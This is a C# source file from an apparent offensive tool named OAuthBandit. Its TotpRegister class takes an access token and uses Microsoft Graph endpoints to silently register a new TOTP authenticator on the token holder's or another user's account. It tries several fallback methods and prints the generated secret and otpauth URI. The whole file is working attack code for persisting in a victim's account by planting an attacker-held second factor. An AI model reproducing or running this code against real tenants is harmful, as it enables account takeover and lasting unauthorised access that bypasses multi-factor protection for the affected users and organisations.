using System.Security.Cryptography;
using System.Text.Json;
using OAuthBandit.Core;

namespace OAuthBandit.Mfa;

public class TotpRegister
{
    private const string GraphBase = "https://graph.microsoft.com/v1.0";
    private const string GraphBeta = "https://graph.microsoft.com/beta";
    private readonly GraphClient _graph;

    public TotpRegister(string accessToken)
    {
        _graph = new GraphClient(accessToken);
    }

    public JsonElement? GetCurrentUser()
    {
        try { return _graph.Get($"{GraphBase}/me"); }
        catch (Exception ex)
        {
            Console.WriteLine($"    [!] Failed to get user info: {ex.Message}");
            return null;
        }
    }

    public TOTPSecret? RegisterTotp(string userId = "me", string displayName = "Authenticator")
    {
        var userInfo = userId == "me" ? GetCurrentUser() : _graph.Get($"{GraphBase}/users/{userId}");
        if (userInfo == null)
        {
            Console.WriteLine("    [!] Cannot get user info");
            return null;
        }

        var upn = userInfo.Value.TryGetProperty("userPrincipalName", out var u) ? u.GetString() ?? "unknown" : "unknown";
        var actualUserId = userInfo.Value.TryGetProperty("id", out var id) ? id.GetString() ?? userId : userId;

        Console.WriteLine($"    [*] Registering TOTP for: {upn}");

        // Method 1: softwareOathMethods (beta)
        var totp = RegisterSoftwareOath(actualUserId, upn, displayName);
        if (totp != null) return totp;

        // Method 2: via microsoftAuthenticator
        RegisterViaAuthenticator(actualUserId, displayName);

        // Method 3: client-side generation with registration attempt
        Console.WriteLine("    [*] Trying client-side TOTP generation...");
        return RegisterClientTotp(actualUserId, upn, displayName);
    }

    private TOTPSecret? RegisterSoftwareOath(string userId, string upn, string displayName)
    {
        try
        {
            var secretBytes = RandomNumberGenerator.GetBytes(20);
            var secretB32 = Base32Encode(secretBytes);

            var payload = new { secretKey = secretB32, timeIntervalInSeconds = 30, hashAlgorithm = "hmacsha1" };
            var (result, status, errCode, errMsg) = _graph.Post(
                $"{GraphBeta}/users/{userId}/authentication/softwareOathMethods", payload);

            if (result != null && result.Value.TryGetProperty("id", out var methodId))
            {
                var mid = methodId.GetString()!;
                var otpUri = $"otpauth://totp/Microsoft:{upn}?secret={secretB32}&issuer=Microsoft&algorithm=SHA1&digits=6&period=30";

                Console.WriteLine($"    [+] TOTP registered via softwareOathMethods");
                Console.WriteLine($"    [+] Method ID: {mid}");
                Console.WriteLine($"    [+] Secret: {secretB32}");

                return new TOTPSecret
                {
                    SecretKey = secretB32,
                    OtpUri = otpUri,
                    MethodId = mid,
                    UserId = userId,
                    DisplayName = displayName
                };
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"    [!] softwareOathMethods failed: {ex.Message}");
        }
        return null;
    }

    private void RegisterViaAuthenticator(string userId, string displayName)
    {
        try
        {
            var (result, _, _, _) = _graph.Post(
                $"{GraphBeta}/users/{userId}/authentication/microsoftAuthenticatorMethods",
                new { displayName });
            if (result != null)
                Console.WriteLine($"    [+] Authenticator method initiated");
        }
        catch { }
    }

    private TOTPSecret RegisterClientTotp(string userId, string upn, string displayName)
    {
        var secretBytes = RandomNumberGenerator.GetBytes(20);
        var secretB32 = Base32Encode(secretBytes);
        var otpUri = $"otpauth://totp/Microsoft:{upn}?secret={secretB32}&issuer=Microsoft&algorithm=SHA1&digits=6&period=30";

        string[] endpoints =
        {
            $"{GraphBeta}/users/{userId}/authentication/softwareOathMethods",
            $"{GraphBase}/users/{userId}/authentication/softwareOathMethods"
        };

        foreach (var endpoint in endpoints)
        {
            try
            {
                var (result, _, _, _) = _graph.Post(endpoint, new { secretKey = secretB32 });
                if (result != null && result.Value.TryGetProperty("id", out var mid))
                {
                    Console.WriteLine($"    [+] TOTP registered via fallback");
                    return new TOTPSecret
                    {
                        SecretKey = secretB32, OtpUri = otpUri,
                        MethodId = mid.GetString()!, UserId = userId, DisplayName = displayName
                    };
                }
            }
            catch { }
        }

        Console.WriteLine("    [!] API registration failed - secret generated for manual use");
        return new TOTPSecret
        {
            SecretKey = secretB32, OtpUri = otpUri,
            MethodId = "pending_manual", UserId = userId, DisplayName = displayName
        };
    }

    private static string Base32Encode(byte[] data)
    {
        const string alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
        var sb = new System.Text.StringBuilder();
        int bits = 0, acc = 0;
        foreach (byte b in data)
        {
            acc = (acc << 8) | b;
            bits += 8;
            while (bits >= 5)
            {
                bits -= 5;
                sb.Append(alphabet[(acc >> bits) & 0x1F]);
            }
        }
        if (bits > 0) sb.Append(alphabet[(acc << (5 - bits)) & 0x1F]);
        return sb.ToString();
    }
}
